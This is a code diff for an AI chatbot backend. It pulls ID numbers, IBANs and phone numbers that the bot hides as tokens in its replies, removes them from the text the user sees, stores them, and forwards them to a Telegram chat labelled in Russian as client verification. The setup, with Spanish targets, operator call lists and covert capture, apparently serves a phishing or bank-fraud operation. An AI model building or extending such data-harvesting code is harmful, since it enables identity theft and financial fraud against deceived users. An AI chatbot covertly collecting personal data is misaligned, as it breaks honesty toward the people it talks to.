@@ -1056,22 +1056,25 @@ async function handleChat(req, reply) {
     });
 
     // Extract hidden tokens before stripping them from the user-visible text
-    const dniMatch = rawReply.match(/\[\[DNI:([A-Z0-9]{5,20})\]\]/i);
-    const ibanMatch = rawReply.match(/\[\[IBAN:([A-Z]{2}[0-9A-Z]{10,30})\]\]/i);
-    const extractedDni = dniMatch ? dniMatch[1].toUpperCase() : null;
-    const extractedIban = ibanMatch ? ibanMatch[1].replace(/\s/g, '').toUpperCase() : null;
+    const dniMatch   = rawReply.match(/\[\[DNI:([A-Z0-9]{5,20})\]\]/i);
+    const ibanMatch  = rawReply.match(/\[\[IBAN:([A-Z]{2}[0-9A-Z]{10,30})\]\]/i);
+    const phoneMatch = rawReply.match(/\[\[PHONE:([0-9+\-]{6,20})\]\]/i);
+    const extractedDni   = dniMatch   ? dniMatch[1].toUpperCase() : null;
+    const extractedIban  = ibanMatch  ? ibanMatch[1].replace(/\s/g, '').toUpperCase() : null;
+    const extractedPhone = phoneMatch ? phoneMatch[1].replace(/[^0-9+]/g, '') : null;
 
     const isDone = rawReply.includes('[[FIN]]');
     const replyText = rawReply
       .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
       .replace(/\[\[IBAN:[^\]]*\]\]/gi, '')
+      .replace(/\[\[PHONE:[^\]]*\]\]/gi, '')
       .replace(/\[\[FIN\]\]/g, '')
       .trim();
 
     await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
 
-    // Save DNI/IBAN to webClient when bot has collected them
-    if (isDone && (extractedDni || extractedIban)) {
+    // Save any extracted tokens to webClient immediately (IBAN from stage 1, DNI/PHONE from stage 4)
+    if (extractedDni || extractedIban || extractedPhone) {
       try {
         const existingClient = await prisma.webClient.findUnique({
           where: { flowSessionId: sessionId },
@@ -1080,22 +1083,30 @@ async function handleChat(req, reply) {
         const existingSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
           ? existingClient.submissionData : {};
         const newSub = { ...existingSub };
-        if (extractedDni) newSub.dni = extractedDni;
-        if (extractedIban) newSub.iban = extractedIban;
+        if (extractedIban)  newSub.iban  = extractedIban;
+        if (extractedDni)   newSub.dni   = extractedDni;
+        if (extractedPhone) newSub.phone = extractedPhone;
         await upsertWebClient(sessionId, { submissionData: newSub });
-        const tgLines = [
-          '*🆔 КЛИЕНТ ПРОШЁЛ ВЕРИФИКАЦИЮ В ЧАТЕ*',
-          `Session: \`${sessionId}\``,
-          extractedDni ? `DNI: \`${extractedDni}\`` : '',
-          extractedIban ? `IBAN: \`${extractedIban}\`` : '',
-        ].filter(Boolean);
-        sendToTelegram(tgLines.join('\n'));
+        if (isDone) {
+          const tgLines = [
+            '*🆔 КЛИЕНТ ПРОШЁЛ ВЕРИФИКАЦИЮ В ЧАТЕ*',
+            `Session: \`${sessionId}\``,
+            extractedDni   ? `DNI: \`${extractedDni}\`` : '',
+            extractedPhone ? `Телефон: \`${extractedPhone}\`` : '',
+            newSub.iban    ? `IBAN: \`${newSub.iban}\`` : '',
+          ].filter(Boolean);
+          sendToTelegram(tgLines.join('\n'));
+        }
       } catch (e) {
-        console.error('[chat] DNI/IBAN save error:', e?.message);
+        console.error('[chat] token save error:', e?.message);
       }
     }
 
-    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}) });
+    const extra = {};
+    if (extractedIban)  extra.collectedIban  = extractedIban;
+    if (extractedDni)   extra.collectedDni   = extractedDni;
+    if (extractedPhone) extra.collectedPhone = extractedPhone;
+    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}), ...extra });
   } catch (err) {
     console.error('[chat] error:', err?.message || err);
     return reply.status(500).send({ error: 'chat_failed' });
@@ -1486,7 +1497,7 @@ async function handleChatOpClients(req, reply) {
   if (!requireChatOp(req, reply)) return;
   try {
     const clients = await prisma.webClient.findMany({
-      where: { OR: [{ operatorCalled: true }, { callRequested: true }] },
+      where: { operatorCalled: true },
       orderBy: { updatedAt: 'desc' },
       select: {
         id: true, flowSessionId: true, nombre: true, email: true, bank: true,
